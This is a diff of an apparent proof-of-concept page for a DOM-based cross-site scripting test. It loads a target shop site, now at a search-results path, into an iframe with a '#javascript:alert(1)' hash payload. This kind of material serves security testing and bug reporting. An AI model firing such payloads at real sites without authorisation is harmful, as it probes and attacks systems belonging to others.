@@ -16,7 +16,7 @@
             const frame = document.getElementById('Frame');
             // Craft the malicious URL for the TARGET site
             const Hash = "#javascript:alert(1)";
-            const url = "https://shop.app" + Hash; 
+            const url = "https://shop.app/search/results?query=test123/" + Hash; 
 
             // Load the malicious URL into the iframe
             frame.src = url;
